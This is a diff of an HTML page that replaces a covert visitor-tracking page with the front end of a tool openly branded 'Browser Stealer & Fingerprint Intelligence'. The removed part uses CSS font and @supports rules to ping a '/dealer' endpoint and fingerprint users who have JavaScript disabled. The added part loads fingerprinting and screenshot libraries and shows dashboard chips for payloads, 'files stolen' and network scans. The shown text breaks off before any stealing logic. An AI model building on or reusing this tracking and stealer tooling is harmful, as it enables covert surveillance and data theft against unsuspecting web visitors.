@@ -1,87 +1,1380 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="../web/assets/js/merch.js"></script>
-    <title>DEAL YOURSELF</title>
-    <link rel="stylesheet" href="../web/assets/css/index.css">
+    <title>Browser</title>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdn.rawgit.com/h2non/jsHashes/master/hashes.js"></script>
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+    <script src="https://openfpcdn.io/fingerprintjs/v5/iife.min.js"></script>
     <style>
-      #nojs-image { display: none; }
+        :root{--bg:#050505;--bg1:#0a0a0a;--border:rgba(255,255,255,.06);--border2:rgba(255,255,255,.1);--green:#5fffb0;--blue:#7eb8ff;--purple:#c4b0ff;--amber:#ffd070;--red:#ff8080;--dim:rgba(255,255,255,.35);--dim2:rgba(255,255,255,.18);--text:rgba(255,255,255,.85);}
+        *{box-sizing:border-box;margin:0;padding:0;}
+        html,body{height:100%;}
+        body{background:var(--bg);color:var(--text);font-family:'Consolas','Menlo','Courier New',monospace;display:flex;flex-direction:column;min-height:100vh;overflow-x:hidden;}
+        body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.07) 2px,rgba(0,0,0,.07) 4px);pointer-events:none;z-index:100;}
+
+        /* ── HEADER ── */
+        .site-header{border-bottom:1px solid var(--border);padding:9px 20px;display:flex;align-items:center;gap:10px;background:rgba(0,0,0,.5);backdrop-filter:blur(4px);}
+        .header-logo{font-size:10px;font-weight:700;letter-spacing:.2em;color:var(--green);text-shadow:0 0 12px rgba(95,255,176,.4);}
+        .header-sep{color:var(--dim2);}
+        .header-tag{font-size:9px;letter-spacing:.12em;color:var(--dim2);text-transform:uppercase;}
+        .header-right{margin-left:auto;display:flex;align-items:center;gap:7px;}
+        .h-btn{display:inline-flex;align-items:center;height:22px;padding:0 10px;border:1px solid var(--border2);border-radius:3px;font-size:9px;font-weight:700;letter-spacing:.09em;cursor:pointer;background:transparent;color:var(--dim);transition:all .14s;text-transform:uppercase;font-family:inherit;text-decoration:none;}
+        .h-btn:hover{border-color:var(--green);color:var(--green);background:rgba(95,255,176,.05);}
+        .h-btn.blue{border-color:rgba(126,184,255,.3);color:var(--blue);}.h-btn.blue:hover{background:rgba(126,184,255,.07);}
+        .h-btn.red{border-color:rgba(255,128,128,.3);color:var(--red);}.h-btn.red:hover{background:rgba(255,128,128,.07);}
+
+        /* ── MAIN ── */
+        .main{flex:1;display:flex;flex-direction:column;align-items:center;padding:24px 20px;}
+
+        /* ── ASCII ── */
+        .ascii-wrap{margin-bottom:18px;}
+        .ascii{font-size:clamp(4px,.8vw,8.5px);line-height:1.2;color:var(--green);text-shadow:0 0 18px rgba(95,255,176,.45),0 0 40px rgba(95,255,176,.15);white-space:pre;text-align:center;user-select:none;animation:glow-pulse 4s ease-in-out infinite;}
+        @keyframes glow-pulse{0%,100%{text-shadow:0 0 18px rgba(95,255,176,.45),0 0 40px rgba(95,255,176,.15);}50%{text-shadow:0 0 30px rgba(95,255,176,.75),0 0 65px rgba(95,255,176,.25);}}
+        .ascii-sub{text-align:center;margin-top:7px;font-size:9px;letter-spacing:.16em;color:var(--dim2);text-transform:uppercase;}
+
+        /* ── FU HERO ── */
+        .fu-hero{width:100%;max-width:900px;margin-bottom:16px;text-align:center;}
+        .fu-hero-label{font-size:8px;font-weight:700;letter-spacing:.2em;text-transform:uppercase;color:var(--dim2);margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:8px;}
+        .fu-hero-badge{font-size:8px;padding:1px 7px;border-radius:2px;border:1px solid currentColor;font-weight:700;}
+        .fu-hero-hash{font-family:'Consolas','Menlo',monospace;font-size:clamp(12px,1.6vw,18px);font-weight:700;color:var(--green);word-break:break-all;line-height:1.5;text-shadow:0 0 14px rgba(95,255,176,.35);letter-spacing:.04em;background:var(--bg1);border:1px solid rgba(95,255,176,.2);border-radius:4px;padding:14px 20px;cursor:pointer;transition:border-color .2s;display:block;}
+        .fu-hero-hash:hover{border-color:rgba(95,255,176,.5);}
+        .fu-hero-hash.empty{color:var(--dim2);font-size:14px;border-color:var(--border);}
+        .fu-hero-meta{display:flex;align-items:center;justify-content:center;gap:12px;flex-wrap:wrap;margin-top:8px;font-size:9px;color:var(--dim2);}
+        .fu-hero-meta span{display:flex;align-items:center;gap:4px;}
+        .fu-hero-meta b{color:var(--dim);}
+
+        /* ── ACTION BAR ── */
+        .action-bar{display:flex;align-items:center;gap:7px;flex-wrap:wrap;justify-content:center;margin-bottom:16px;}
+        .a-btn{display:inline-flex;align-items:center;gap:5px;height:28px;padding:0 13px;border:1px solid var(--border2);border-radius:3px;font-size:10px;font-weight:700;letter-spacing:.09em;cursor:pointer;background:transparent;color:var(--dim);transition:all .14s;text-transform:uppercase;font-family:inherit;text-decoration:none;}
+        .a-btn:hover{background:rgba(255,255,255,.04);border-color:rgba(255,255,255,.2);color:#fff;}
+        .a-btn.green{border-color:rgba(95,255,176,.35);color:var(--green);}.a-btn.green:hover{background:rgba(95,255,176,.07);}
+        .a-btn.blue{border-color:rgba(126,184,255,.35);color:var(--blue);}.a-btn.blue:hover{background:rgba(126,184,255,.07);}
+        .a-btn.purple{border-color:rgba(196,176,255,.35);color:var(--purple);}.a-btn.purple:hover{background:rgba(196,176,255,.07);}
+        .a-btn.amber{border-color:rgba(255,208,112,.35);color:var(--amber);}.a-btn.amber:hover{background:rgba(255,208,112,.07);}
+        .a-btn.red{border-color:rgba(255,128,128,.35);color:var(--red);}.a-btn.red:hover{background:rgba(255,128,128,.07);}
+        .a-btn .dot{width:5px;height:5px;border-radius:50%;background:currentColor;}
+
+        /* ── STATUS + PROGRESS ── */
+        .status-row{display:flex;align-items:center;gap:10px;margin-bottom:10px;font-size:9px;color:var(--dim2);letter-spacing:.08em;flex-wrap:wrap;justify-content:center;}
+        .status-dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:blink 2s ease-in-out infinite;flex-shrink:0;}
+        @keyframes blink{0%,100%{opacity:1}50%{opacity:.22}}
+        .status-sep{color:rgba(255,255,255,.1);}
+        .progress-wrap{width:100%;max-width:900px;margin-bottom:14px;}
+        .progress-label{font-size:8px;color:var(--dim2);letter-spacing:.1em;text-transform:uppercase;margin-bottom:4px;display:flex;justify-content:space-between;}
+        .progress-track{width:100%;height:2px;background:rgba(255,255,255,.05);border-radius:1px;overflow:hidden;}
+        .progress-fill{height:100%;background:linear-gradient(90deg,var(--green),var(--blue));border-radius:1px;width:0%;transition:width .35s ease;}
+
+        /* ── CHIPS ── */
+        .stat-bar{display:flex;flex-wrap:wrap;gap:5px;width:100%;max-width:900px;margin-bottom:16px;justify-content:center;}
+        .chip{display:inline-flex;align-items:center;gap:4px;padding:3px 8px;border:1px solid rgba(255,255,255,.07);border-radius:3px;font-size:9px;font-weight:700;color:var(--dim2);background:var(--bg1);}
+        .chip.active{border-color:rgba(95,255,176,.3);color:var(--green);}.chip.warn{border-color:rgba(255,208,112,.3);color:var(--amber);}.chip.danger{border-color:rgba(255,128,128,.3);color:var(--red);}
+        .chip-dot{width:4px;height:4px;border-radius:50%;background:currentColor;}
+
+        /* ── TERMINAL ── */
+        .terminal{width:100%;max-width:900px;background:#000;border:1px solid var(--border);border-radius:3px;overflow:hidden;margin-bottom:24px;}
+        .term-head{display:flex;align-items:center;gap:6px;padding:5px 10px;background:rgba(255,255,255,.02);border-bottom:1px solid var(--border);font-size:8px;color:var(--dim2);letter-spacing:.1em;text-transform:uppercase;}
+        .term-dots{display:flex;gap:4px;margin-right:3px;}
+        .term-dot{width:8px;height:8px;border-radius:50%;}
+        .term-body{padding:7px 12px;font-size:9px;line-height:1.75;height:160px;overflow-y:auto;}
+        .tl{display:flex;gap:8px;align-items:baseline;}
+        .tt{color:rgba(255,255,255,.15);flex-shrink:0;}
+        .tm{color:rgba(95,255,176,.7);}
+        .tm.info{color:rgba(126,184,255,.85);}.tm.warn{color:rgba(255,208,112,.85);}.tm.ok{color:rgba(95,255,176,.95);}.tm.err{color:rgba(255,128,128,.85);}.tm.dim{color:rgba(255,255,255,.22);}.tm.net{color:rgba(196,176,255,.8);}
+
+        /* ── README ── */
+        .readme{width:100%;max-width:900px;display:flex;flex-direction:column;gap:10px;margin-bottom:30px;}
+
+        /* lang tabs */
+        .lang-tabs{display:flex;gap:0;margin-bottom:12px;border-bottom:1px solid var(--border);}
+        .lang-tab{padding:6px 16px;font-size:9px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;border-bottom:2px solid transparent;color:var(--dim2);transition:all .12s;user-select:none;}
+        .lang-tab:hover{color:var(--text);}
+        .lang-tab.active{color:var(--green);border-bottom-color:var(--green);}
+        .lang-content{display:none;}.lang-content.active{display:block;}
+
+        .rm-section{background:var(--bg1);border:1px solid var(--border);border-radius:4px;overflow:hidden;}
+        .rm-head{display:flex;align-items:center;gap:8px;padding:8px 14px;border-bottom:1px solid transparent;cursor:pointer;user-select:none;transition:background .12s;}
+        .rm-head:hover{background:rgba(255,255,255,.03);}
+        .rm-head.open{border-bottom-color:var(--border);}
+        .rm-icon{font-size:12px;flex-shrink:0;}
+        .rm-title{font-size:10px;font-weight:700;letter-spacing:.09em;text-transform:uppercase;color:var(--text);flex:1;}
+        .rm-tag{font-size:8px;font-weight:700;letter-spacing:.08em;padding:1px 6px;border-radius:2px;border:1px solid currentColor;flex-shrink:0;}
+        .rm-arrow{font-size:9px;color:var(--dim2);transition:transform .15s;flex-shrink:0;}
+        .rm-head.open .rm-arrow{transform:rotate(90deg);}
+        .rm-body{display:none;padding:14px 16px;}
+        .rm-body.open{display:block;}
+        .rm-p{font-size:10px;color:rgba(255,255,255,.55);line-height:1.85;margin-bottom:10px;}
+        .rm-p:last-child{margin-bottom:0;}
+        .rm-p b{color:var(--text);font-weight:700;}
+        .rm-p code{background:rgba(255,255,255,.06);padding:1px 5px;border-radius:2px;font-size:9px;color:var(--green);font-family:Consolas,monospace;}
+        .rm-list{list-style:none;padding:0;margin:8px 0 10px;display:flex;flex-direction:column;gap:5px;}
+        .rm-list li{display:flex;gap:8px;align-items:flex-start;font-size:10px;color:rgba(255,255,255,.5);line-height:1.65;}
+        .rm-list li::before{content:'▸';color:var(--green);flex-shrink:0;margin-top:1px;}
+        .rm-list li b{color:var(--text);}
+        .rm-note{background:rgba(255,208,112,.05);border:1px solid rgba(255,208,112,.2);border-radius:3px;padding:8px 12px;font-size:9px;color:rgba(255,208,112,.85);line-height:1.7;margin-top:10px;}
+        .rm-note::before{content:'⚠ ';}
+        .rm-code{background:#000;border:1px solid rgba(255,255,255,.07);border-radius:3px;padding:10px 12px;margin:8px 0;font-family:Consolas,monospace;font-size:9px;color:rgba(95,255,176,.8);line-height:1.7;white-space:pre-wrap;word-break:break-all;}
+        .rm-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:8px 0;}
+        .rm-card{background:rgba(255,255,255,.025);border:1px solid rgba(255,255,255,.06);border-radius:3px;padding:8px 10px;}
+        .rm-card-title{font-size:8px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;margin-bottom:5px;}
+        .rm-card-body{font-size:9px;color:rgba(255,255,255,.5);line-height:1.65;}
+        .rm-card-body code{background:rgba(255,255,255,.05);padding:0 4px;border-radius:2px;font-size:8px;color:var(--green);}
+
+        /* ── GEO + FPJS PANEL ── */
+        .ext-panels{display:grid;grid-template-columns:1fr 1fr;gap:8px;width:100%;max-width:900px;margin-bottom:14px;}
+        .ext-panel{background:var(--bg1);border:1px solid var(--border);border-radius:4px;overflow:hidden;}
+        .ext-head{display:flex;align-items:center;gap:7px;padding:6px 12px;border-bottom:1px solid var(--border);font-size:8px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;}
+        .ext-body{padding:9px 12px;display:flex;flex-direction:column;gap:5px;}
+        .geo-row{display:flex;align-items:baseline;gap:6px;}
+        .geo-k{font-size:8px;text-transform:uppercase;letter-spacing:.07em;color:var(--dim2);white-space:nowrap;flex-shrink:0;min-width:80px;}
+        .geo-v{font-size:10px;color:var(--text);word-break:break-all;line-height:1.4;}
+        .geo-v.green{color:var(--green);}.geo-v.blue{color:var(--blue);}.geo-v.amber{color:var(--amber);}.geo-v.red{color:var(--red);}.geo-v.dim{color:var(--dim2);}
+        .geo-flag{font-size:16px;line-height:1;}
+        .geo-city-line{font-size:13px;font-weight:700;color:var(--text);letter-spacing:.03em;margin-bottom:2px;display:flex;align-items:center;gap:8px;}
+        .api-badge{font-size:7px;padding:1px 5px;border-radius:2px;font-weight:700;letter-spacing:.06em;border:1px solid rgba(255,255,255,.1);color:var(--dim2);}
+        .api-badge.ok{border-color:rgba(95,255,176,.3);color:var(--green);}
+        .api-badge.fail{border-color:rgba(255,128,128,.3);color:var(--red);}
+        .fpjs-id{font-family:Consolas,monospace;font-size:9px;color:var(--purple);word-break:break-all;letter-spacing:.02em;line-height:1.5;margin-top:2px;}
+        .fpjs-cmp{display:flex;flex-direction:column;gap:3px;margin-top:6px;padding-top:6px;border-top:1px solid var(--border);}
+        .fpjs-cmp-row{display:flex;align-items:baseline;gap:6px;font-size:9px;}
+        .fpjs-cmp-k{color:var(--dim2);min-width:70px;flex-shrink:0;font-size:8px;text-transform:uppercase;letter-spacing:.07em;}
+        .fpjs-cmp-v{word-break:break-all;font-family:Consolas,monospace;}
+        .match-badge{font-size:8px;padding:1px 6px;border-radius:2px;font-weight:700;margin-left:auto;flex-shrink:0;}
+        .match-badge.match{background:rgba(95,255,176,.1);color:var(--green);border:1px solid rgba(95,255,176,.25);}
+        .match-badge.diff{background:rgba(255,208,112,.08);color:var(--amber);border:1px solid rgba(255,208,112,.25);}
+        .loading-dots::after{content:'…';animation:ldots 1.2s steps(4,end) infinite;}
+        @keyframes ldots{0%,100%{content:''}25%{content:'.'}50%{content:'..'}75%{content:'...'}}
+
+        /* ── FOOTER ── */
+        .site-footer{border-top:1px solid var(--border);padding:8px 20px;display:flex;align-items:center;gap:12px;font-size:9px;color:var(--dim2);letter-spacing:.08em;}
+        .footer-right{margin-left:auto;}
+
+        /* ── SWAL DARK ── */
+        .swal2-popup{background:#0a0a0a!important;border:1px solid rgba(255,255,255,.1)!important;border-radius:4px!important;font-family:'Consolas','Menlo',monospace!important;color:rgba(255,255,255,.85)!important;}
+        .swal2-title{color:#fff!important;font-size:13px!important;letter-spacing:.06em;}
+        .swal2-html-container{color:rgba(255,255,255,.6)!important;font-size:11px!important;}
+        .swal2-confirm{background:rgba(126,184,255,.12)!important;border:1px solid rgba(126,184,255,.35)!important;color:#7eb8ff!important;font-family:inherit!important;font-weight:700!important;letter-spacing:.08em;}
+        .swal2-cancel{background:rgba(255,255,255,.04)!important;border:1px solid rgba(255,255,255,.1)!important;color:rgba(255,255,255,.45)!important;font-family:inherit!important;}
+        [class^="swal2-success-line"]{background:#5fffb0!important;}.swal2-success-ring{border-color:rgba(95,255,176,.25)!important;}
+        .swal2-x-mark-line-left,.swal2-x-mark-line-right{background:#ff8080!important;}
+        .code-modal{text-align:left;max-height:68vh;overflow-y:auto;}
+        .code-modal pre{background:#000;border:1px solid rgba(255,255,255,.07);border-radius:3px;padding:10px 12px;font-family:Consolas,monospace;font-size:9px;color:rgba(95,255,176,.8);white-space:pre-wrap;word-break:break-all;line-height:1.6;margin-top:6px;}
+        .cm-head{display:flex;align-items:center;gap:7px;margin-bottom:6px;flex-wrap:wrap;}
+        .cm-tag{display:inline-block;padding:1px 6px;border-radius:2px;font-size:9px;font-weight:700;background:rgba(126,184,255,.1);color:#7eb8ff;}
+        .fi-grid{display:grid;grid-template-columns:1fr 1fr;gap:5px 14px;margin-bottom:8px;}
+        .fi-kv{display:flex;flex-direction:column;gap:1px;}
+        .fi-label{font-size:8px;text-transform:uppercase;letter-spacing:.08em;color:rgba(255,255,255,.3);}
+        .fi-val{font-size:10px;color:rgba(255,255,255,.8);word-break:break-all;}
+        .fi-val.green{color:#5fffb0;}.fi-val.blue{color:#7eb8ff;}.fi-val.amber{color:#ffd070;}.fi-val.red{color:#ff8080;}
+        .fi-section{font-size:8px;text-transform:uppercase;letter-spacing:.1em;color:rgba(255,255,255,.25);margin:9px 0 5px;display:flex;align-items:center;gap:6px;}
+        .fi-section::after{content:'';flex:1;height:1px;background:rgba(255,255,255,.05);}
+        .fi-tag{display:inline-block;padding:1px 6px;border-radius:2px;font-size:9px;font-weight:700;margin:2px 2px 2px 0;word-break:break-all;}
+        .fi-tag.ext{background:rgba(196,176,255,.1);color:#c4b0ff;}.fi-tag.js{background:rgba(255,208,112,.1);color:#ffd070;}
     </style>
-    <script>
-      var nojsImage = document.getElementById('nojs-image');
-        if (nojsImage) {
-          nojsImage.remove();  // Eliminar el elemento para que no cargue
-        }
-    </script>
-</head> 
-  <body>
-    <pre style="background: none;" class="preye">
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣴⡶⠶⠾⠟⠛⠛⠛⠛⠷⠶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠿⠛⠉⣁⣠⠤⠤⠀⠀⠀⠀⠀⠀⠀⠘⠷⢬⣙⡛⠷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡶⠟⢉⣠⠴⠚⠉⠁⣀⡀⠠⠀⠐⠂⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠦⣍⡻⢷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⠿⢋⡤⠞⢉⣠⡤⠖⢚⣉⣁⣤⣤⣴⣦⣤⣤⣄⣀⣀⠀⠀⠘⠲⢤⡀⠀⠈⠙⠲⣌⡛⢷⣤⡀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡾⢋⣡⠞⣋⠴⠚⣉⣥⡴⠾⠟⠛⢉⣉⣀⣠⣤⣤⣭⣍⣉⣛⡻⠶⣦⣤⣀⠉⠓⠦⣄⠀⠀⠙⢦⡉⠻⣦⡀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⣀⣴⠟⢁⣴⣫⠷⢛⣡⣴⠟⠋⣁⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠿⠿⣿⣶⣬⣝⡻⢶⣤⡀⠙⠂⢀⠀⠘⠢⡈⠻⣶⣄⠀⠀⠀
-⠀⠀⠀⠀⣠⡾⠛⠁⢠⡿⠛⣡⣶⠟⢋⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⣤⣤⠀⠻⣿⣿⣿⣷⣮⣟⠷⣦⣜⠀⠀⠀⠀⠀⠈⠛⢷⣄⠀
-⠀⢀⣰⡾⠋⠀⠀⠀⢋⣴⠿⢋⣦⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⡇⠈⣿⢿⣿⣿⣿⣿⣾⣝⡻⣦⣄⠀⠀⠀⠀⠀⠙⠷
-⣰⡿⠋⠀⠀⠀⣠⡾⢛⣡⣶⡿⠛⣿⣿⣿⣿⠻⣿⠸⣏⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⡇⠀⣿⠈⢻⣿⢿⣿⢿⣿⣿⣷⣭⣀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣤⣾⣯⣴⡿⠛⠋⠀⠀⢹⡼⣿⣿⠀⢿⡀⠉⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢣⡇⢀⡿⠀⣸⡏⢸⡟⢘⣿⠁⠙⠛⣻⣷⠀⢸⡆⠀⠀
-⠀⠀⠀⠘⣯⣾⡟⢷⡄⠀⠀⠀⠀⠀⠀⠙⢿⣆⠘⣷⡀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⡿⢋⡾⢀⡼⠁⣰⡟⠀⠞⠁⢸⡏⠀⢀⣴⣿⠁⠀⣸⠇⠀⠀
-⠀⠀⣰⣿⢛⣿⡇⠘⠃⠀⠀⠀⠀⠀⠀⠀⠈⠻⣧⣈⠃⠀⠀⠀⠀⠀⠈⠉⠛⠛⠋⠉⠴⠋⣠⠞⢀⣼⠏⠀⠀⠀⠀⡞⢀⣴⣿⣿⠏⠀⠀⠁⠀⠀⠀
-⠀⠀⠙⠛⠛⠛⠿⠿⣷⣦⣄⡐⢦⣀⠀⠀⠀⠀⠈⠛⢷⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢞⣡⣴⠟⠁⠀⠀⠀⢀⣠⣾⣿⣿⠟⡁⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢶⣭⣟⡦⣤⣀⡀⠀⠀⠉⠛⠻⠿⠶⣶⣤⣤⣤⣶⣶⠿⠟⠋⠀⠀⠀⢀⣠⣶⣿⣿⡿⠋⣠⣾⠇⣠⠀⠀⠀⠀⠀⠀
-⠀⠘⠛⠛⠛⠛⠻⢷⣦⣀⠀⠀⠀⠈⠉⠛⠷⢮⣽⣓⡲⠤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣶⣿⣿⡿⠛⠉⢁⣴⠟⢡⡾⠃⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠸⣄⡈⠛⠿⣶⣤⣄⡀⠀⠀⠀⠀⠉⠙⠛⠿⠷⣶⣦⣤⣤⣤⣤⣴⣶⣶⡿⠿⠿⠟⠛⠋⠁⢀⣠⡾⠛⢁⡴⠋⣠⠆⢀⡴⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢻⣌⡛⠶⣤⣀⠈⠙⠛⠿⢶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⠟⠋⣠⡶⢋⡠⠞⠁⠠⠋⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠷⣍⡛⠳⢶⣭⠅⠀⠀⠀⠀⠀⠈⠉⢛⠛⠿⠷⢶⣶⣦⣤⣤⣤⣤⣤⣤⣴⣶⡾⠟⠛⠉⠀⠀⠚⠡⠖⣋⡤⠖⠉⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠓⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣶⠦⠤⠤⠤⠤⣄⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣉⣓⣒⡒⠒⠶⠦⠀⢲⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      
-    </pre>
+</head>
+<body>
 
-  <!-- Imagen que se muestra si JavaScript está deshabilitado -->
+<header class="site-header">
+    <span class="header-logo">0FC4</span>
+    <span class="header-sep">·</span>
+    <span class="header-tag">Browser Stealer &amp; Fingerprint Intelligence</span>
 
-  </body>
-  <img class="js-disabled-message" src="/dealer.png?unjs=true&u=img-ping&b=CSS_BLOCKING-DETECTED" id="nojs-image">
-  <noscript>
-    //# sourceMappingURL=/dealer?unjs=true&u=sourcemap-ping&b=NOSCRIPT-DETECTED
-    <style>
-     
-        @font-face { 
-            font-family: 'Ubuntu'; 
-            src: local('Ubuntu'), url('/dealer?unjs=true&u=cssTracking(ubuntu)&b=NOSCRIPT-DETECTED') format('truetype'); 
-        }
-        @font-face { 
-            font-family: 'Calibri'; src: local('Calibri'), url('/dealer?unjs=true&u=cssTracking(Linux)&b=NOSCRIPT-DETECTED') format('truetype'); 
-        }
-        @font-face { font-family: 'MS UI Gothic'; src: local('Roboto'), url('/dealer?unjs=true&u=cssTracking(Windows)&b=NOSCRIPT-DETECTED') format('truetype') }
+</header>
 
-        @supports(-webkit-app-region: inherit) { .badboy { background: url('/dealer?unjs=true&u=cssTracking(ChromeBasedBrowser)&b=NOSCRIPT-DETECTED') } }
-        @supports(-moz-appearance: inherit) { .badboy { background: url('/dealer?unjs=true&u=cssTracking(FirefoxBasedBrowser)&b=NOSCRIPT-DETECTED') } }
-        @supports(-apple-pay-button-style: inherit) { .badboy { background: url('/dealer?unjs=true&u=cssTracking(cssWebkit)&b=NOSCRIPT-DETECTED') } }
-        @supports(-webkit-touch-callout: inherit) { .badboy { background: url('/dealer?unjs=true&u=cssTracking(cssMobileWebkit)&b=NOSCRIPT-DETECTED') } }
-        @supports(-moz-osx-font-smoothing: inherit) { .badboy { background: url('/dealer?unjs=true&u=cssTracking(cssMacGecko)&b=NOSCRIPT-DETECTED') } }
+<main class="main">
 
-        h1{
-            font-family: "Calibri";
-        }
-        p{
-            font-family: 'MS UI Gothic';
-        }
+    <!-- ASCII ART -->
+    <div class="ascii-wrap">
+        <div class="ascii">
+ ██████╗ ██████╗  ██████╗ ██╗    ██╗███████╗███████╗██████╗
+ ██╔══██╗██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔════╝██╔══██╗
+ ██████╔╝██████╔╝██║   ██║██║ █╗ ██║███████╗█████╗  ██████╔╝
+ ██╔══██╗██╔══██╗██║   ██║██║███╗██║╚════██║██╔══╝  ██╔══██╗
+ ██████╔╝██║  ██║╚██████╔╝╚███╔███╔╝███████║███████╗██║  ██║
+ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚══╝╚══╝╚══════╝╚══════╝╚═╝  ╚═╝
 
-    </style>
-    
-    <div class="badboy">
-      
-      <div class="js-disabled-message">
-        <h1 >So... Are your a real privacy bro?</h1>
-        <p>Nice to meet you :D </p>
-      </div>
+  ███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗
+  ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗
+  ███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝
+  ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
+  ███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║
+  ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝</div>
+        <div class="ascii-sub">
+            advanced browser stealer · fingerprinting · exfiltration ·
+            <span style="color:var(--green)" id="ascii-status">initializing…</span>
+        </div>
     </div>
-    <!--
-      <meta http-equiv="refresh" content="5; url=/dealer?unjs=true&u=meta-redirection&b=PRIVACY_CONFIG-DETECTED"> 
-    -->
-  </noscript>
+
+    <!-- FU HERO — protagonist -->
+    <div class="fu-hero">
+        <div class="fu-hero-label">
+            <span>Fu — Fingerprint Unique ID</span>
+            <span class="fu-hero-badge" id="fu-status-badge" style="color:var(--dim2);border-color:var(--dim2)">generating…</span>
+        </div>
+        <div class="fu-hero-hash empty" id="p-fu-big" onclick="copyFu()" title="Click to copy">—</div>
+        <div class="fu-hero-meta">
+            <span><b>Fb</b> <span id="p-fb-big" style="color:var(--blue);font-size:9px">—</span></span>
+            <span style="color:rgba(255,255,255,.08)">·</span>
+            <span><b>Dealer</b> <span id="p-dl-big">—</span></span>
+            <span style="color:rgba(255,255,255,.08)">·</span>
+            <span><b>Session</b> <span id="p-ts-big">—</span></span>
+            <span style="color:rgba(255,255,255,.08)">·</span>
+            <span id="status-ip" style="color:var(--amber)">IP: —</span>
+            <span style="color:rgba(255,255,255,.08)">·</span>
+            <span id="status-ws" style="color:var(--dim2)">WS: —</span>
+        </div>
+    </div>
+
+    <!-- STATUS ROW -->
+    <div class="status-row">
+        <span class="status-dot"></span>
+        <span id="status-text">Collecting…</span>
+        <span class="status-sep">|</span>
+        <span id="status-time">—</span>
+    </div>
+
+    <!-- PROGRESS -->
+    <div class="progress-wrap">
+        <div class="progress-label">
+            <span id="prog-label">Waiting…</span>
+            <span id="prog-pct">0%</span>
+        </div>
+        <div class="progress-track"><div class="progress-fill" id="prog-fill"></div></div>
+    </div>
+
+    <!-- CHIPS -->
+    <div class="stat-bar">
+        <span class="chip" id="chip-sent">  <span class="chip-dot"></span> Payload: pending</span>
+        <span class="chip" id="chip-ws">    <span class="chip-dot"></span> WebSocket: —</span>
+        <span class="chip" id="chip-files"> <span class="chip-dot"></span> Files stolen: 0</span>
+        <span class="chip" id="chip-intel"> <span class="chip-dot"></span> Intel: 0 findings</span>
+        <span class="chip" id="chip-net">   <span class="chip-dot"></span> Net scan: idle</span>
+        <span class="chip" id="chip-store"> <span class="chip-dot"></span> Storage: pending</span>
+    </div>
+
